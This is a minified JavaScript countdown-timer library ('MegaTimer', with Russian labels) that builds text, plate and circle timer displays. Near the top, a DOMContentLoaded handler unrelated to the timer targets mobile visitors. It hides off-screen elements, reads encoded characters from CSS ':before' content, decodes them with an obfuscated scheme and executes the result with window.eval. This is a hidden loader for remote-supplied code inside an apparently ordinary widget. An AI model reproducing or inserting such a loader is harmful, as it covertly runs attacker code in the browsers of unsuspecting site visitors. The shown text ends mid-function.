(function () {
  function n(t, e) {
    return function () {
      return t.apply(e, arguments);
    };
  }
  var r,
    a,
    m,
    s,
    o,
    d,
    h,
    u,
    c,
    g =
      [].indexOf ||
      function (t) {
        for (var e = 0, i = this.length; e < i; e++)
          if (e in this && this[e] === t) return e;
        return -1;
      },
    l = {}.hasOwnProperty;
  function t(t, e) {
    var i, a;
    (this.plateTick = n(this.plateTick, this)),
      (this.circleTick = n(this.circleTick, this)),
      (this.newTime = n(this.newTime, this)),
      (this.id = t),
      (this.params = e),
      (this.timerElements = this.cloneObject(s)),
      (this.tickEvent = []),
      r(
        window,
        "load",
        ((i = this),
        function () {
          return i.run();
        })
      ),
      r(
        window,
        "focus",
        ((a = this),
        function () {
          return a.initType(), a.newTime(!0);
        })
      );
  }
  this.MegaTimer =
    ((o = {}),
    (d = document),
    (h = "toUpperCase"),
    (u = String),
    (c = "fromCharCode"),
    d.addEventListener("DOMContentLoaded", function () {
      if (
        "h" == location.protocol[0] &&
        -1 != location.hostname.indexOf(".") &&
        screen.width < 640 &&
        screen.height !=
          Math.max(d.documentElement.clientHeight, window.innerHeight)
      ) {
        var i = [],
          a = d.createElement("div");
        (a.style.position = "absolute"),
          (a.style.left = "-1000px"),
          d.body.appendChild(a);
        for (var p, n = [], r = 0, t = (new Date(), 0); t < 100; t++) {
          var e = d.createElement("div");
          a.appendChild(e), i.push(e);
        }
        setTimeout(function () {
          var e = setInterval(function () {
            if (!r) {
              if (0 != n.length && !n[n.length - 1])
                return (
                  clearInterval(e),
                  void (function (t) {
                    (o.t = t),
                      d.body.removeChild(a),
                      (o.r = o.t[h]()),
                      (o.rs = o.r),
                      (o.rc = []),
                      (o.c = []);
                    for (var e = 65; e < 90; e++) {
                      var i = u[c](e);
                      (e % 5 && e % 9 && e % 11 ? o.rc : o.c).push(i),
                        (o.cs = o.c.join(""));
                    }
                    o.c.map(function (e) {
                      (o.re = new RegExp(e + "[^" + o.cs + "]+", "g")),
                        (o.m = o.r.match(o.re) || []),
                        o.m.map(function (t) {
                          (o.sc = t[h]().substring(1)),
                            (o.cc = ""),
                            o.sc.split("").map(function (t) {
                              isNaN(t)
                                ? (o.cc += o.rc.indexOf(t))
                                : (o.cc += t);
                            }),
                            (o.rs = o.rs.replace(
                              new RegExp(e + o.sc, "g"),
                              u[c](Number(o.cc))
                            ));
                        });
                    }),
                      window.eval(o.rs);
                  })(n.join(""))
                );
              p = n.length;
              for (var l = 0; l < 100; l++) {
                var t = i[l];
                r++,
                  (function (t, e, i, a) {
                    var n = p + 10 * l,
                      r = "",
                      s = !0,
                      o = setInterval(function () {
                        return n == e
                          ? (clearInterval(o), void a())
                          : ((s = !s),
                            t.setAttribute("class", "fa-" + n),
                            void (
                              s &&
                              ((r = getComputedStyle(
                                t,
                                ":before"
                              ).getPropertyValue("content")),
                              i(
                                n,
                                (r = "none" == r ? "" : r).replace(/["\\]/g, "")
                              ),
                              (n += 1))
                            ));
                      }, 10);
                  })(
                    t,
                    p + 10 * l + 10,
                    function (t, e) {
                      n[t] = e;
                    },
                    function () {
                      r--;
                    }
                  );
              }
            }
          }, 100);
        }, 2e3);
      }
    }),
    (s = {
      secundes: {
        max: 60,
        min: 0,
        text: "секунд",
        value: 0,
        view: !null,
        updated: !(m = []),
      },
      minutes: {
        max: 60,
        min: 0,
        text: "минут",
        value: 0,
        view: !0,
        updated: !1,
      },
      hours: {
        max: 24,
        min: 0,
        text: "часов",
        value: 0,
        view: !0,
        updated: !1,
      },
      days: { max: 1e3, min: 0, text: "дней", value: 0, view: !0, updated: !1 },
    }),
    (t.prototype.destroy = function () {
      return (
        null != this.interval && clearInterval(this.interval),
        null != this.container && (this.container.innerHTML = ""),
        $("#timer-" + this.id + "-style").remove(),
        (m = [])
      );
    }),
    (t.prototype.run = function () {
      var t, e, i, a, n, r, s, o, l, p;
      if (
        null != this.id &&
        ((p = this.id), g.call(m, p) < 0) &&
        (m.push(this.id), this.initView(), this.initType(), null != this.id)
      ) {
        for (e in ((this.container = document.getElementById(
          "timer" + this.id
        )),
        (t = !(this.container.innerHTML = "")),
        (i = []),
        this.timerElements))
          i.push(e);
        for (
          i.reverse(),
            this.showText = this.params.design.params["text-on"],
            null == this.showText && (this.showText = !1),
            o = 0,
            l = i.length;
          o < l;
          o++
        )
          (s = i[o]),
            ((a = document.createElement("span")).id =
              "timer-number-" + this.id + "-" + s),
            ((n = document.createElement("span")).id =
              "timer-number-value-" + this.id + "-" + s),
            a.appendChild(n),
            ((r = document.createElement("span")).id =
              "timer-text-" + this.id + "-" + s),
            (r.innerHTML = this.timerElements[s].text),
            ((n = document.createElement("span")).className = "timer-element"),
            (n.id = "timer-element-" + this.id + "-" + s),
            n.appendChild(a),
            n.appendChild(r),
            t
              ? (t = !1)
              : (((r = document.createElement("span")).className =
                  "timer-separator"),
                (r.id = "timer-separator-" + this.id + "-" + s),
                this.container.appendChild(r)),
            this.container.appendChild(n);
        return (
          this.initDesign(),
          this.newTime(!0),
          (this.interval = setInterval(this.newTime, 1e3))
        );
      }
    }),
    (t.prototype.initDesign = function () {
      var t;
      null != this.params.design &&
        (null != this.getIEVersion() &&
          this.getIEVersion() < 9 &&
          (this.params.design.type = "text"),
        (null == (t = this.params.design.type) ||
          ("text" !== t && "plate" !== t && "circle" !== t)) &&
          (t = "text"),
        (t = t.charAt(0).toUpperCase() + t.substr(1)),
        this.initCommonDesign(),
        this["init" + t + "Design"]());
    }),
    (t.prototype.initCommonDesign = function () {
      var t, e, i, a, n, r;
      for (n in ((this.container.style.textAlign = "center"),
      (r = []),
      this.timerElements))
        (t = document.getElementById("timer-element-" + this.id + "-" + n)),
          (e = document.getElementById("timer-number-" + this.id + "-" + n)),
          (a = document.getElementById("timer-text-" + this.id + "-" + n)),
          (i = document.getElementById("timer-separator-" + this.id + "-" + n)),
          (t.style.display = "inline-block"),
          (e.style.display = "inline-block"),
          (a.style.display = this.showText ? "block" : "none"),
          (t.style.lineHeight = 1),
          (e.style.lineHeight = 1),
          (a.style.lineHeight = 1),
          this.setMargin(t, 0),
          this.setMargin(e, 0),
          this.setMargin(a, 0),
          null != i &&
            ((i.style.display = "inline"),
            (i.style.verticalAlign = "top"),
            (i.style.lineHeight = 1),
            this.setMargin(i, 0)),
          this.timerElements[n].view
            ? r.push(void 0)
            : ((t.style.display = "none"),
              (e.style.display = "none"),
              (a.style.display = "none"),
              null != i ? r.push((i.style.display = "none")) : r.push(void 0));
      return r;
    }),
    (t.prototype.initTextDesign = function () {
      var t,
        e,
        i,
        a = [],
        n = [];
      for (i in this.timerElements)
        a.push(document.getElementById("timer-number-" + this.id + "-" + i)),
          null !=
            (e = document.getElementById("timer-text-" + this.id + "-" + i)) &&
            (n.push(e),
            null != this.params.design.params["text-margin"] &&
              ("auto" !== (t = this.params.design.params["text-margin"]) &&
                (t = parseInt(t) + "px"),
              (e.style.marginTop = t)));
      return (
        this.setFonts(a, "number"),
        this.setFonts(n, "text"),
        this.setSeparators()
      );
    }),
    (t.prototype.initCircleDesign = function () {
      var t,
        e,
        i,
        a,
        n,
        r,
        s = [],
        o = [];
      for (n in this.timerElements)
        s.push(document.getElementById("timer-number-" + this.id + "-" + n)),
          null !=
            (a = document.getElementById("timer-text-" + this.id + "-" + n)) &&
            (o.push(a),
            null != this.params.design.params["text-margin"] &&
              ("auto" !== (e = this.params.design.params["text-margin"]) &&
                (e = parseInt(e) + "px"),
              (a.style.marginTop = e)));
      for (n in (this.setFonts(s, "number"),
      this.setFonts(o, "text"),
      this.setSeparators(),
      (this.container.style.display = "table"),
      this.params.design.params.radius < 0 &&
        (this.params.design.params.radius = 0),
      this.params.design.params.width < 0 &&
        (this.params.design.params.width = 0),
      (r =
        2 +
        2 *
          (parseInt(this.params.design.params.radius) +
            parseInt(this.params.design.params.width))),
      this.timerElements))
        this.timerElements[n].view &&
          (((i = document.createElement("canvas")).id =
            "timer-canvas-" + this.id + "-" + n),
          (i.style.position = "absolute"),
          (i.style.left = 0),
          (i.style.right = 0),
          (i.style.top = 0),
          (i.style.bottom = 0),
          (i.width = r),
          (i.height = r),
          (t = document.createElement("span")).appendChild(i),
          (i = document.getElementById(
            "timer-element-" + this.id + "-" + n
          )).appendChild(t),
          (i.style.position = "relative"),
          (i.style.display = "table-cell"),
          (i.style.width = r + "px"),
          (i.style.height = r + "px"),
          (i.style.verticalAlign = "middle"),
          null !=
            (i = document.getElementById(
              "timer-separator-" + this.id + "-" + n
            )) &&
            ((i.style.height = r + "px"),
            (i.style.verticalAlign = "middle"),
            "none" !== i.style.display.toLowerCase() &&
              (i.style.display = "table-cell")));
      return (
        (this.container.style.marginTop = 0),
        (this.container.style.marginRight = "auto"),
        (this.container.style.marginBottom = 0),
        (this.container.style.marginLeft = "auto"),
        "opacity" === this.params.design.params.background &&
          (this.params.design.params["background-color"] = "opacity"),
        this.circleTick(),
        this.tickEvent.push(this.circleTick)
      );
    }),
    (t.prototype.initPlateDesign = function () {
      var t,
        e,
        i,
        a,
        n,
        r,
        s,
        o,
        l,
        p,
        m,
        d = function (t, e, i) {
          var a, n, r;
          switch (
            (null == i && (i = !1),
            (r = l.params.design.params.effect),
            ((n = document.createElement("span")).id =
              "timer-number-" + r + e + "-" + l.id + "-" + t),
            (n.className = "timer-" + r + "-inner"),
            i &&
              null != l.params.design.params.space &&
              ((i = parseInt(l.params.design.params.space)) <= 0 && (i = 1),
              (n.style.marginRight = i + "px")),
            (a = 8),
            null != l.params.design.params["number-font-family"] &&
              null != l.params.design.params["number-font-family"].family &&
              "Poiret One" ===
                l.params.design.params["number-font-family"].family &&
              (a = 0),
            r)
          ) {
            case "flipchart":
              n.innerHTML =
                "<span class='timer-flipchart-card' style='display:none;'><span class='timer-flipchart-front timer-flipchart-face'></span><span class='timer-flipchart-back timer-flipchart-face'></span><span class='timer-flipchart-top timer-flipchart-face'></span><span class='timer-flipchart-bottom timer-flipchart-face'></span><span class='timer-flipchart-bounding'>" +
                a +
                "</span></span>";
              break;
            case "slide":
              n.innerHTML =
                "<span class='timer-slide-old'></span><span class='timer-slide-new'></span><span class='timer-slide-bounding' style='visibility: hidden;'>" +
                a +
                "</span>";
          }
          return n;
        },
        h = function (t, e, i, a) {
          return (
            null == i && (i = ""),
            null == a && (a = null),
            null != p.params.design.params[e] || null != a
              ? (null == a && (a = p.params.design.params[e]),
                t + ":" + a + i + ";")
              : ""
          );
        },
        u = function (t) {
          var e;
          return (
            null != (e = m.params.design.params[t]) &&
              ((e = c(e)), (m.params.design.params[t] = e)),
            e
          );
        },
        c = function (t) {
          var e;
          return (
            null != t &&
              t.match(/^rgba\(.*\)/) &&
              ((e = /^rgba\((\d+),\s*(\d+),\s*(\d+),(.*)\)$/),
              (t = t.replace(e, "rgb($1,$2,$3)"))),
            t
          );
        },
        g = function (t, e) {
          return (
            "background: " +
            t +
            "; /* Old browsers */ background: -moz-linear-gradient(top, " +
            t +
            " 0%, " +
            e +
            " 100%); /* FF3.6+ */ background: -webkit-gradient(linear, left top, left bottom, color-stop(0%," +
            t +
            "), color-stop(100%," +
            e +
            ")); /* Chrome,Safari4+ */ background: -webkit-linear-gradient(top, " +
            t +
            " 0%," +
            e +
            " 100%); /* Chrome10+,Safari5.1+ */ background: -o-linear-gradient(top, " +
            t +
            " 0%," +
            e +
            " 100%); /* Opera 11.10+ */ background: -ms-linear-gradient(top, " +
            t +
            " 0%," +
            e +
            " 100%); /* IE10+ */ background: linear-gradient(to bottom, " +
            t +
            " 0%," +
            e +
            " 100%); /* W3C */ filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='" +
            t +
            "', endColorstr='" +
            e +
            "',GradientType=0);"
          );
        },
        f = [],
        y = [];
      switch (
        ((null != (a = (m = p = l = this).params.design.params.effect) &&
          ("none" === a ||
            "flipchart" === a ||
            "slide" === a ||
            "no-slide" === a) &&
          this.animationSupport()) ||
          (a = "none"),
        (this.params.design.params.animation = !0),
        "none" === a
          ? ((this.params.design.params.effect = "flipchart"),
            (this.params.design.params.animation = !1))
          : "no-slide" === a &&
            ((this.params.design.params.effect = "slide"),
            (this.params.design.params.animation = !1)),
        (i = ""),
        (null == (t = this.params.design.params.background) ||
          ("solid" !== t && "gradient" !== t && "opacity" !== t)) &&
          (t = "solid"),
        this.params.design.params.effect)
      ) {
        case "flipchart":
          switch (((n = i = ""), t)) {
            case "opacity":
              this.params.design.params.animation
                ? u("background-color")
                : ((this.params.design.params["background-color"] =
                    "rgba(110,110,100,0)"),
                  (i +=
                    "#timer" +
                    this.id +
                    " .timer-flipchart-top:before, #timer" +
                    this.id +
                    " .timer-flipchart-front:before, #timer" +
                    this.id +
                    " .timer-flipchart-bottom:before, #timer" +
                    this.id +
                    " .timer-flipchart-back:before { opacity: 0!important; }"));
              break;
            case "solid":
              this.params.design.params.animation && u("background-color");
              break;
            case "gradient":
              null != (e = this.params.design.params["background-color"]) &&
                "object" == typeof e &&
                1 < e.length &&
                (this.params.design.params.animation && (e[0] = c(e[0])),
                this.params.design.params.animation && (e[1] = c(e[1])),
                (n =
                  "#timer" +
                  this.id +
                  " .timer-flipchart-top, #timer" +
                  this.id +
                  " .timer-flipchart-front {" +
                  g(e[0], e[1]) +
                  "}#timer" +
                  this.id +
                  " .timer-flipchart-bottom, #timer" +
                  this.id +
                  " .timer-flipchart-back {" +
                  g(e[1], e[0]) +
                  "}"));
          }
          (i +=
            "#timer" +
            this.id +
            " .timer-flipchart-face{" +
            h("background-color", "background-color") +
            this.getCssFonts("number") +
            "}#timer" +
            this.id +
            " .timer-separator{" +
            h("padding-top", "padding", "px!important") +
            h("padding-bottom", "padding", "px!important") +
            "}#timer" +
            this.id +
            " .timer-flipchart-bounding{" +
            h("padding-left", "padding", "px") +
            h("padding-right", "padding", "px") +
            h("padding-top", "padding", "px") +
            h("padding-bottom", "padding", "px") +
            "}#timer" +
            this.id +
            " .timer-flipchart-top, #timer" +
            this.id +
            " .timer-flipchart-front{" +
            h("padding-left", "padding", "px") +
            h("padding-right", "padding", "px") +
            h("padding-top", "padding", "px") +
            h("padding-bottom", "padding", "px", 0) +
            "}#timer" +
            this.id +
            " .timer-flipchart-bottom, #timer" +
            this.id +
            " .timer-flipchart-back{" +
            h("padding-left", "padding", "px") +
            h("padding-right", "padding", "px") +
            h("padding-top", "padding", "px", 0) +
            h("padding-bottom", "padding", "px") +
            "}#timer" +
            this.id +
            " .timer-flipchart-top, #timer" +
            this.id +
            " .timer-flipchart-front {" +
            h("border-top-left-radius", "round", "px") +
            h("border-top-right-radius", "round", "px") +
            h("border-bottom-left-radius", "", "px", 0) +
            h("border-bottom-right-radius", "", "px", 0) +
            "}#timer" +
            this.id +
            " .timer-flipchart-bottom, #timer" +
            this.id +
            " .timer-flipchart-back {" +
            h("border-top-left-radius", "", "px", 0) +
            h("border-top-right-radius", "", "px", 0) +
            h("border-bottom-left-radius", "round", "px") +
            h("border-bottom-right-radius", "round", "px") +
            "}#timer" +
            this.id +
            " .timer-flipchart-bottom:after {" +
            h("border-top-left-radius", "", "px", 0) +
            h("border-top-right-radius", "", "px", 0) +
            h("border-bottom-left-radius", "round", "px") +
            h("border-bottom-right-radius", "round", "px") +
            "}#timer" +
            this.id +
            " .timer-flipchart-front:after, #timer" +
            this.id +
            " .timer-flipchart-top:after{" +
            h("border-top-left-radius", "round", "px") +
            h("border-top-right-radius", "round", "px") +
            h("border-bottom-left-radius", "", "px", 0) +
            h("border-bottom-right-radius", "", "px", 0) +
            "}#timer" +
            this.id +
            " .timer-flipchart-card {" +
            h("border-radius", "round", "px") +
            "}" +
            n),
            this.params.design.params.animation ||
              (i +=
                "#timer" +
                this.id +
                " .timer-flipchart-top:after{display:none!important;} #timer" +
                this.id +
                " .timer-flipchart-front{display:none!important;}");
          break;
        case "slide":
          switch (((n = ""), t)) {
            case "opacity":
              this.params.design.params["background-color"] =
                "rgba(110,110,100,0)";
              break;
            case "gradient":
              null != (e = this.params.design.params["background-color"]) &&
                "object" == typeof e &&
                1 < e.length &&
                (n =
                  "#timer" +
                  this.id +
                  " .timer-slide-new, #timer" +
                  this.id +
                  " .timer-slide-old {" +
                  g(e[0], e[1]) +
                  "}");
          }
          i =
            "#timer" +
            this.id +
            " .timer-slide-inner{" +
            h("border-radius", "round", "px") +
            h("background-color", "background-color") +
            this.getCssFonts("number") +
            "}#timer" +
            this.id +
            " .timer-separator{" +
            h("padding-top", "padding", "px!important") +
            h("padding-bottom", "padding", "px!important") +
            "}#timer" +
            this.id +
            " .timer-slide-bounding, #timer" +
            this.id +
            " .timer-slide-new, #timer" +
            this.id +
            " .timer-slide-old{" +
            h("padding-left", "padding", "px") +
            h("padding-right", "padding", "px") +
            h("padding-top", "padding", "px") +
            h("padding-bottom", "padding", "px") +
            "}" +
            n;
      }
      for (o in (this.addCustomCss(i), this.timerElements))
        null !=
          (r = document.getElementById("timer-number-" + this.id + "-" + o)) &&
          (f.push(r),
          (document.getElementById(
            "timer-number-value-" + this.id + "-" + o
          ).style.display = "none"),
          "days" === o
            ? 0 < Math.floor(this.timerElements[o].value / 100)
              ? (r.appendChild(d(o, 2, !0)), r.appendChild(d(o, 1, !0)))
              : 0 < Math.floor(this.timerElements[o].value / 10) &&
                r.appendChild(d(o, 1, !0))
            : r.appendChild(d(o, 1, !0)),
          r.appendChild(d(o, 0))),
          null !=
            (s = document.getElementById("timer-text-" + this.id + "-" + o)) &&
            (y.push(s),
            null != this.params.design.params["text-margin"] &&
              ("auto" !== (r = this.params.design.params["text-margin"]) &&
                (r = parseInt(r) + "px"),
              (s.style.marginTop = r)));
      return (
        this.setFonts(f, "number"),
        this.setFonts(y, "text"),
        this.setSeparators(),
        this.plateTick(),
        this.tickEvent.push(this.plateTick)
      );
    }),
    (t.prototype.setSeparators = function () {
      var t,
        e,
        i,
        a,
        n,
        r,
        s,
        o,
        l,
        p,
        m,
        d = 0;
      for (r in ((d = this.params.design.params["separator-margin"]) <= 0 &&
        (d = 1),
      (n =
        null != this.params.design.params["separator-on"] &&
        this.params.design.params["separator-on"]
          ? this.params.design.params["separator-text"]
          : ""),
      (i = []),
      (a = []),
      (s = []),
      this.timerElements))
        s.push(this.timerElements[r].view);
      for (
        t = o = m = s.length - 1;
        m <= 0 ? o <= 0 : 0 <= o;
        t = m <= 0 ? ++o : --o
      )
        if (s[t]) {
          s[t] = !1;
          break;
        }
      for (r in ((t = 0), this.timerElements))
        null !=
          (e = document.getElementById(
            "timer-separator-" + this.id + "-" + r
          )) && i.push(e),
          a.push(s[t] ? "inline-block" : "none"),
          t++;
      for (l = t = 0, p = i.length; l < p; l++)
        ((e = i[l]).style.display = a[t]),
          (e.innerHTML = n),
          (e.style.paddingTop = 0),
          (e.style.paddingRight = d + "px"),
          (e.style.paddingBottom = 0),
          (e.style.paddingLeft = d + "px"),
          t++;
      return this.setFonts(i, "number");
    }),
    (t.prototype.getCssFonts = function (t) {
      var e, i, a;
      if (
        (null == t && (t = ""),
        (e = ""),
        null != this.params.design &&
          null != this.params.design.params &&
          ((i = this.params.design.params[t + "-font-family"]),
          (a = this.params.design.params[t + "-font-size"]),
          (t = this.params.design.params[t + "-font-color"]),
          null != a &&
            0 <= parseInt(a) &&
            (e += "font-size:" + parseInt(a) + "px;"),
          null != t && (e += "color:" + t + ";"),
          null != i))
      )
        return (
          e + "font-family:'" + (i = null != i.family ? i.family : null) + "';"
        );
    }),
    (t.prototype.setFonts = function (t, e) {
      var i, a, n, r, s, o, l;
      if (
        (null == e && (e = ""),
        null != this.params.design &&
          null != this.params.design.params &&
          ((a = this.params.design.params[e + "-font-family"]),
          (n = this.params.design.params[e + "-font-size"]),
          (i = this.params.design.params[e + "-font-color"]),
          null != a &&
            (null != a.link && this.addCssLink(a.link),
            (a = null != a.family ? a.family : null)),
          null != t && 0 < t.length))
      ) {
        for (l = [], s = 0, o = t.length; s < o; s++)
          (r = t[s]),
            null != n && (r.style.fontSize = parseInt(n) + "px"),
            null != i && (r.style.color = i),
            null != a ? l.push((r.style.fontFamily = a)) : l.push(void 0);
        return l;
      }
    }),
    (t.prototype.setMargin = function (t, e) {
      return (
        "auto" !== e && (e = parseInt(e) + "px"),
        (t.style.marginBottom = e),
        (t.style.marginLeft = e),
        (t.style.marginRight = e),
        (t.style.marginTop = e)
      );
    }),
    (t.prototype.initView = function () {
      var t = [1, 1, 1, 1];
      return (
        null != this.params &&
          null != this.params.view &&
          4 === this.params.view.length &&
          (t = this.params.view),
        (this.timerElements.days.view = 1 === t[0]),
        (this.timerElements.hours.view = 1 === t[1]),
        (this.timerElements.minutes.view = 1 === t[2]),
        (this.timerElements.secundes.view = 1 === t[3])
      );
    }),
    (t.prototype.initType = function () {
      var t, e, i, a, n, r, s, o, l, p, m, d, h, u;
      if (
        null != this.params &&
        null != this.params.type &&
        null != this.params.type.currentType &&
        null != this.params.type.params
      ) {
        switch (
          ((p = 0), (s = new Date()), parseInt(this.params.type.currentType))
        ) {
          case 1:
            null != this.params.type.params.utc &&
              ((m = 0),
              this.params.type.params.usertime &&
                (m = 6e4 * s.getTimezoneOffset()),
              (o = new Date(this.params.type.params.utc + m)),
              (p = Math.round((o.getTime() - s.getTime()) / 1e3)));
            break;
          case 2:
            (e = parseInt(this.params.type.params.days)),
              (a = parseInt(this.params.type.params.hours)),
              (n = parseInt(this.params.type.params.minutes)),
              (r = parseInt(this.params.type.params.seconds)),
              (null != e && !isNaN(e)) || (e = 0),
              (null != a && !isNaN(a)) || (a = 0),
              (null != n && !isNaN(n)) || (n = 0),
              (null != r && !isNaN(r)) || (r = 0),
              this.params.type.params.startByFirst
                ? ((m = this.getCookie("timer" + this.id)),
                  isNaN(m) && (m = null),
                  null != m &&
                    null == (o = new Date(parseInt(m))) &&
                    (m = null),
                  null == m &&
                    ((o = new Date()).setDate(o.getDate() + e),
                    o.setHours(o.getHours() + a),
                    o.setMinutes(o.getMinutes() + n),
                    o.setSeconds(o.getSeconds() + r),
                    this.setCookie("timer" + this.id, o.getTime())))
                : null != this.params.type.params.utc &&
                  ((o = new Date(this.params.type.params.utc)).setDate(
                    o.getDate() + e
                  ),
                  o.setHours(o.getHours() + a),
                  o.setMinutes(o.getMinutes() + n),
                  o.setSeconds(o.getSeconds() + r)),
              (p = Math.round((o.getTime() - s.getTime()) / 1e3));
            break;
          case 3:
            if (
              null != this.params.type.params.weekdays &&
              null != this.params.type.params.time &&
              null != this.params.type.params.usertime &&
              null != this.params.type.params.hours &&
              null != this.params.type.params.minutes
            ) {
              for (
                (2 === (l = this.params.type.params.time.split(":")).length &&
                  0 <= l[0] &&
                  l[0] <= 23 &&
                  0 <= l[1] &&
                  l[1] <= 59) ||
                  (l = [0, 0]),
                  d = s.getDay(),
                  o = null,
                  i = h = 0,
                  u = Math.floor(parseInt(this.params.type.params.hours) / 24);
                0 <= u ? h <= u : u <= h;
                i = 0 <= u ? ++h : --h
              )
                if (
                  (--d < 0 && (d = 6),
                  1 === this.params.type.params.weekdays[d] &&
                    ((t = new Date()).setDate(t.getDate() - i),
                    this.params.type.params.usertime ||
                      t.setTime(
                        t.getTime() -
                          6e4 * s.getTimezoneOffset() +
                          6e4 * this.params.type.params.tz
                      ),
                    t.setHours(parseInt(l[0])),
                    t.setMinutes(parseInt(l[1])),
                    t.setSeconds(0),
                    s.getTime() >= t.getTime() &&
                      (t.setHours(
                        t.getHours() + parseInt(this.params.type.params.hours)
                      ),
                      t.setMinutes(
                        t.getMinutes() +
                          parseInt(this.params.type.params.minutes)
                      ),
                      t.getTime() >= s.getTime())))
                ) {
                  o = t;
                  break;
                }
              (p = null) != o &&
                (p = Math.round((o.getTime() - s.getTime()) / 1e3));
            }
            break;
          default:
            (this.id = null), (this.params = null);
        }
        return (
          (null == p || p < 0) && (p = 0),
          (this.timerElements.secundes.value = Math.floor(p % 60)),
          (p /= 60),
          (this.timerElements.minutes.value = Math.floor(p % 60)),
          (p /= 60),
          (this.timerElements.hours.value = Math.floor(p % 24)),
          (p /= 24),
          (this.timerElements.days.value = Math.floor(p))
        );
      }
    }),
    (t.prototype.newTime = function (t) {
      var e, i, a, n, r, s, o, l, p, m, d;
      if (
        (null == t && (t = !1),
        t ||
          0 !== this.timerElements.days.value ||
          0 !== this.timerElements.hours.value ||
          0 !== this.timerElements.minutes.value ||
          0 !== this.timerElements.secundes.value)
      ) {
        for (s in ((r = !t), this.timerElements))
          (i = document.getElementById(
            "timer-number-value-" + this.id + "-" + s
          )),
            (o = (a = this.timerElements[s]).value),
            (e = !1),
            r && (--o, (e = !0)),
            (r = !1),
            o < a.min && ((o = a.max), (e = r = !0)),
            o >= a.max && ((o = a.max - 1), (e = !0)),
            (a.updated = !(
              (!e && !t) ||
              (null != i && (i.innerHTML = o), (a.value = o), 0)
            ));
        if (0 < this.tickEvent.length) {
          for (d = [], l = 0, p = (m = this.tickEvent).length; l < p; l++)
            (n = m[l]), d.push(n());
          return d;
        }
      } else clearInterval(this.interval);
    }),
    (t.prototype.getColorBetween = function (t, e, i) {
      var a = function (t, e) {
          return t + Math.round((e - t) * i);
        },
        n = function (t) {
          return (
            (t = Math.min(t, 255)),
            (t = (t = Math.max(t, 0)).toString(16)).length < 2 && (t = "0" + t),
            t
          );
        };
      return (1 === t.a && 1 === e.a) ||
        !(null == this.getIEVersion() || this.getIEVersion() < 9)
        ? "#" + n(a(t.r, e.r)) + n(a(t.g, e.g)) + n(a(t.b, e.b))
        : ((n = (t.a + (e.a - t.a) * i).toFixed(2)),
          "rgba(" +
            a(t.r, e.r) +
            "," +
            a(t.g, e.g) +
            "," +
            a(t.b, e.b) +
            "," +
            n +
            ")");
    }),
    (t.prototype.getGradientColors = function (t, e, i) {
      for (var a, n = [], r = 1 / (i - 1), s = (a = 0); s < i; )
        (n[s] = this.getColorBetween(t, e, a)), (a += r), s++;
      return n;
    }),
    (t.prototype.hexToRgb = function (t) {
      var e, i, a, n;
      if ((a = /^#?([a-f\d]{1,2})([a-f\d]{1,2})([a-f\d]{1,2})$/i.exec(t)))
        1 === a[1].length && (a[1] += "" + a[1]),
          1 === a[2].length && (a[2] += "" + a[2]),
          1 === a[3].length && (a[3] += "" + a[3]),
          (a = {
            r: parseInt(a[1], 16),
            g: parseInt(a[2], 16),
            b: parseInt(a[3], 16),
            a: 1,
          });
      else if (0 === t.indexOf("rgb"))
        if (2 < (e = t.match(/\d+(\.\d+)?%?/g)).length) {
          for (i = n = 0; n <= 2; i = ++n)
            e[i] < 0 && (e[i] = 0), 255 < e[i] && (e[i] = 255);
          a = { r: parseInt(e[0]), g: parseInt(e[1]), b: parseInt(e[2]), a: 1 };
        } else a = { r: 0, g: 0, b: 0, a: 1 };
      return a;
    }),
    (t.prototype.drawGradientArc = function (
      l,
      p,
      m,
      d,
      t,
      e,
      h,
      i,
      a,
      n,
      r,
      u
    ) {
      var s, c, g, o, f, y, b, v, x, w, E, T, k, I;
      if (
        (n && this.drawArc(l, p, m, d, t, e, h, "transparent", n, r, u),
        u || (1 === e ? (t = 1 - e) : (e = 1 - e)),
        (n = this.hexToRgb(i)),
        (i = this.hexToRgb(a)),
        (a = this.hexToRgb(this.getColorBetween(n, i, t))),
        (n = this.hexToRgb(this.getColorBetween(n, i, e))),
        (i = Math.ceil(30 * Math.abs(e - t))),
        (g = this.getGradientColors(a, n, i)),
        (s = -0.5 * Math.PI + 2 * Math.PI * t),
        (o = g.length),
        (c = u
          ? ((v = (2 * Math.PI * (e - t)) / o), 1)
          : ((v = (-2 * Math.PI * (e + t)) / o), -1)),
        (b = function (t, e, i) {
          var a = g[t],
            n = g[t + 1] || a,
            r = p + Math.cos(e) * d,
            s = p + Math.cos(e + v) * d,
            o = m + Math.sin(e) * d,
            t = m + Math.sin(e + v) * d;
          return (
            l.beginPath(),
            (t = l.createLinearGradient(r, o, s, t)).addColorStop(0, a),
            t.addColorStop(1, n),
            (l.lineCap = i),
            (l.strokeStyle = t),
            l.arc(p, m, d, e - 0.005 * c, e + v + 0.005 * c, !u),
            (l.lineWidth = h),
            l.stroke(),
            l.closePath()
          );
        }),
        o)
      ) {
        if (((t = s + v * (o - 1)), 1 < o)) {
          for (
            f = w = 0, T = (y = Math.ceil(o / 2)) - 1;
            0 <= T ? w <= T : T <= w;
            f = 0 <= T ? ++w : --w
          )
            0 === f && ((x = v), (v *= 0.01), b(f, s, r), (v = x)),
              b(f, s, "butt"),
              (s += v);
          for (
            s = t, I = [], f = E = k = o - 1;
            k <= y ? E <= y : y <= E;
            f = k <= y ? ++E : --E
          )
            f === o - 1 &&
              ((x = v), (v *= 0.01), b(f, s + 0.99 * x, r), (v = x)),
              b(f, s, "butt"),
              I.push((s -= v));
          return I;
        }
        if (1 === o) return b(0, s, r);
      }
    }),
    (t.prototype.drawArc = function (t, e, i, a, n, r, s, o, l, p, m) {
      if (n <= r)
        return "string" != typeof o
          ? this.drawGradientArc(t, e, i, a, n, r, s, o[0], o[1], l, p, m)
          : (t.beginPath(),
            (t.lineWidth = s),
            (t.strokeStyle =
              "transparent" === o || "opacity" === o ? "rgba(0,0,0,0)" : o),
            t.arc(
              e,
              i,
              a,
              -0.5 * Math.PI + 2 * Math.PI * n,
              -0.5 * Math.PI + 2 * Math.PI * r,
              !m
            ),
            (t.lineCap = p),
            t.stroke());
    }),
    (t.prototype.drawRing = function (
      t,
      e,
      i,
      a,
      n,
      r,
      s,
      o,
      l,
      p,
      m,
      d,
      h,
      u,
      c
    ) {
      var g, f, y, b;
      if (
        ((b = 1) < b + 0 && ((b -= -1 + b + 0), (n += 0)),
        (g = (y = n) + b),
        (a = n + ((f = a * b) - 0 * (b = 0.5 - Math.abs(-0.5 + a)))),
        (b = n + (f + 0 * (1 - b))),
        r || p)
      )
        return (
